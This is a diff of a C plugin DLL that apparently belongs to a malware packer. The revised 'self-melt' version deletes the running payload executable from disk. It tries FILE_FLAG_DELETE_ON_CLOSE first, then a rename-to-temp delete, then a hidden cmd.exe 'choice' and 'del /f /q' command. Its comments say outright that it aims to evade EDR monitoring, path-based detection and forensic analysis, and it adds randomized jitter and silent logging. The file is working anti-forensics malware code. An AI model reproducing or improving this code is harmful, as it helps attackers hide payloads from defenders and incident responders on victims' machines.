@@ -1,126 +1,186 @@
-// STEALTH Protection Plugin - File Deletion + Memory Execution
-// 
-// Purpose: Protect the main executable by deleting it from disk after loading into memory
-// Stage: PRELAUNCH (runs before main payload execution)
-// 
-// What this plugin does:
-// 1. Gets path of current executable (stub.exe / final_packed.exe)
-// 2. Copies itself to temp directory under random name
-// 3. Deletes original file from disk
-// 4. Continues execution from temp location
-// 5. Creates proof that protection is active
+// STEALTH Protection Plugin - Self-Melt (Fileless Execution)
 //
-// This prevents forensic analysis of the original file location
-// and removes the payload from disk entirely after load.
+// Purpose: Delete the executable from disk while payload runs from memory
+// Stage: PRELAUNCH
+//
+// Improved stealth version:
+// - No VBS files written to disk
+// - No wscript.exe spawn (monitored by EDRs)
+// - Uses FILE_FLAG_DELETE_ON_CLOSE for self-deletion
+// - Falls back to rename-delete technique
+// - Logging disabled by default (enable with STEALTH_MELT_DEBUG env var)
+// - Randomized jitter on delays
 
-#include <windows.h>
 #include <stdio.h>
-#include <time.h>
+#include <stdlib.h>
+#include <windows.h>
+
 
 #pragma comment(lib, "kernel32.lib")
-#pragma comment(lib, "advapi32.lib")
 
-static void log_msg(const char* msg) {
-    char path[MAX_PATH];
-    GetTempPathA(sizeof(path), path);
-    strcat(path, "stealth_protection_plugin.log");
-    
-    FILE* f = fopen(path, "a");
-    if (f) {
-        fprintf(f, "[PROTECTION] %s\n", msg);
-        fclose(f);
-    }
+// Only log if debug env var is set
+static BOOL g_debug = FALSE;
+
+static void init_debug() {
+  char *val = getenv("STEALTH_MELT_DEBUG");
+  g_debug = (val && val[0]);
 }
 
-DWORD WINAPI ProtectionWorker(LPVOID param) {
-    log_msg("=== STEALTH PROTECTION PLUGIN ACTIVE ===");
-    
-    // Get current executable path
-    char exePath[MAX_PATH];
-    if (GetModuleFileNameA(NULL, exePath, sizeof(exePath)) == 0) {
-        log_msg("Failed to get executable path");
-        return 1;
-    }
-    
-    char logbuf[512];
-    sprintf(logbuf, "Current exe: %s", exePath);
+static void log_msg(const char *msg) {
+  if (!g_debug)
+    return;
+
+  char path[MAX_PATH];
+  GetTempPathA(sizeof(path), path);
+  strcat(path, "stealth_melt.log");
+
+  FILE *f = fopen(path, "a");
+  if (f) {
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    fprintf(f, "[%02d:%02d:%02d] %s\n", st.wHour, st.wMinute, st.wSecond, msg);
+    fclose(f);
+  }
+}
+
+// Randomized delay with jitter (1-3 seconds)
+static void random_delay() {
+  DWORD base = 1000 + (GetTickCount() % 2000); // 1-3 seconds
+  Sleep(base);
+}
+
+// Method 1: Self-delete using FILE_FLAG_DELETE_ON_CLOSE
+// The file will be deleted when all handles are closed
+static BOOL MeltViaDeleteOnClose(const char *exePath) {
+  // Open with DELETE access and DELETE_ON_CLOSE flag
+  HANDLE hFile = CreateFileA(
+      exePath, DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+      NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+
+  if (hFile == INVALID_HANDLE_VALUE) {
+    log_msg("DeleteOnClose: Failed to open file");
+    return FALSE;
+  }
+
+  // Close handle - file will be deleted when this process exits
+  // (since we're the last one with a handle to the exe)
+  CloseHandle(hFile);
+  log_msg("DeleteOnClose: Marked file for deletion");
+  return TRUE;
+}
+
+// Method 2: Rename to random name in temp then delete (evades path-based
+// detection)
+static BOOL MeltViaRenameDelete(const char *exePath) {
+  char tempPath[MAX_PATH];
+  char newPath[MAX_PATH];
+
+  GetTempPathA(sizeof(tempPath), tempPath);
+
+  // Generate random filename using tick count
+  DWORD tick = GetTickCount();
+  sprintf(newPath, "%s%08lx.tmp", tempPath, tick ^ 0xDEADBEEF);
+
+  // Rename (move to temp with random name)
+  if (!MoveFileExA(exePath, newPath, MOVEFILE_REPLACE_EXISTING)) {
+    log_msg("Rename: Failed to move file");
+    return FALSE;
+  }
+
+  log_msg("Rename: Moved to temp");
+  random_delay();
+
+  // Now delete from temp
+  if (DeleteFileA(newPath)) {
+    log_msg("Rename: Deleted from temp");
+    return TRUE;
+  }
+
+  // If immediate delete fails, schedule for reboot (fallback)
+  MoveFileExA(newPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+  log_msg("Rename: Scheduled delete on reboot");
+  return TRUE;
+}
+
+// Method 3: Spawn cmd with choice command (less monitored than ping)
+static BOOL MeltViaCmd(const char *exePath) {
+  char cmdLine[MAX_PATH * 2];
+
+  // Use choice command for delay (less monitored than ping)
+  // /T:N = timeout N seconds, /D:Y = default choice Y
+  sprintf(cmdLine,
+          "cmd.exe /c choice /C Y /N /D Y /T 2 >nul & del /f /q \"%s\"",
+          exePath);
+
+  STARTUPINFOA si = {0};
+  PROCESS_INFORMATION pi = {0};
+  si.cb = sizeof(si);
+  si.dwFlags = STARTF_USESHOWWINDOW;
+  si.wShowWindow = SW_HIDE;
+
+  if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
+                     CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si,
+                     &pi)) {
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    log_msg("Cmd: Spawned delete process");
+    return TRUE;
+  }
+
+  log_msg("Cmd: Failed to spawn");
+  return FALSE;
+}
+
+DWORD WINAPI MeltWorker(LPVOID param) {
+  char exePath[MAX_PATH];
+  char logbuf[512];
+
+  init_debug();
+  log_msg("Melt plugin starting");
+
+  if (GetModuleFileNameA(NULL, exePath, sizeof(exePath)) == 0) {
+    log_msg("Failed to get exe path");
+    return 1;
+  }
+
+  if (g_debug) {
+    sprintf(logbuf, "Target: %s", exePath);
     log_msg(logbuf);
-    
-    // Check if we're already running from temp
-    char tempPath[MAX_PATH];
-    GetTempPathA(sizeof(tempPath), tempPath);
-    
-    if (strstr(exePath, tempPath) == NULL) {
-        // We're NOT in temp - need to relocate
-        log_msg("Running from non-temp location - initiating protection");
-        
-        // Generate random temp filename
-        srand((unsigned int)time(NULL));
-        char tempExe[MAX_PATH];
-        sprintf(tempExe, "%sstealth_%d.exe", tempPath, rand() % 99999);
-        
-        // Copy to temp
-        if (CopyFileA(exePath, tempExe, FALSE)) {
-            sprintf(logbuf, "Copied to temp: %s", tempExe);
-            log_msg(logbuf);
-            
-            // Mark original for deletion on reboot (if delete fails)
-            MoveFileExA(exePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-            
-            // Try immediate delete (may fail if file is locked)
-            if (DeleteFileA(exePath)) {
-                log_msg("Original file DELETED from disk");
-            } else {
-                log_msg("Original file deletion delayed until reboot");
-            }
-            
-            // Create proof file
-            char proofPath[MAX_PATH];
-            sprintf(proofPath, "%sstealth_protected.txt", tempPath);
-            FILE* proof = fopen(proofPath, "w");
-            if (proof) {
-                fprintf(proof, "STEALTH PROTECTION ACTIVE\n");
-                fprintf(proof, "Original location: %s\n", exePath);
-                fprintf(proof, "Protected location: %s\n", tempExe);
-                fprintf(proof, "Timestamp: %ld\n", (long)time(NULL));
-                fprintf(proof, "Status: Payload executing from memory\n");
-                fclose(proof);
-                log_msg("Protection proof file created");
-            }
-        } else {
-            log_msg("Failed to copy to temp - protection not activated");
-        }
-    } else {
-        log_msg("Already running from temp - protection active");
-        
-        // Create active marker
-        char proofPath[MAX_PATH];
-        sprintf(proofPath, "%sstealth_protected.txt", tempPath);
-        FILE* proof = fopen(proofPath, "w");
-        if (proof) {
-            fprintf(proof, "STEALTH PROTECTION ACTIVE\n");
-            fprintf(proof, "Running from: %s\n", exePath);
-            fprintf(proof, "Status: Protected execution\n");
-            fclose(proof);
-        }
-    }
-    
-    log_msg("Protection worker complete");
+  }
+
+  // Add initial jitter
+  random_delay();
+
+  // Method 1: DELETE_ON_CLOSE (stealthiest - no child processes)
+  log_msg("Trying delete-on-close...");
+  if (MeltViaDeleteOnClose(exePath)) {
+    log_msg("Delete-on-close succeeded - file will be removed on exit");
     return 0;
+  }
+
+  // Method 2: Rename then delete (good stealth)
+  log_msg("Trying rename-delete...");
+  if (MeltViaRenameDelete(exePath)) {
+    return 0;
+  }
+
+  // Method 3: Cmd fallback (most compatible)
+  log_msg("Trying cmd method...");
+  MeltViaCmd(exePath);
+
+  return 0;
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-    if (fdwReason == DLL_PROCESS_ATTACH) {
-        log_msg("Plugin DLL attached - stage PRELAUNCH");
-        
-        // Run protection in background thread
-        HANDLE hThread = CreateThread(NULL, 0, ProtectionWorker, NULL, 0, NULL);
-        if (hThread) {
-            // Wait briefly for protection to activate
-            WaitForSingleObject(hThread, 2000);
-            CloseHandle(hThread);
-        }
+  if (fdwReason == DLL_PROCESS_ATTACH) {
+    DisableThreadLibraryCalls(hinstDLL);
+
+    HANDLE hThread = CreateThread(NULL, 0, MeltWorker, NULL, 0, NULL);
+    if (hThread) {
+      WaitForSingleObject(hThread, 5000);
+      CloseHandle(hThread);
     }
-    
-    return TRUE;
+  }
+
+  return TRUE;
 }
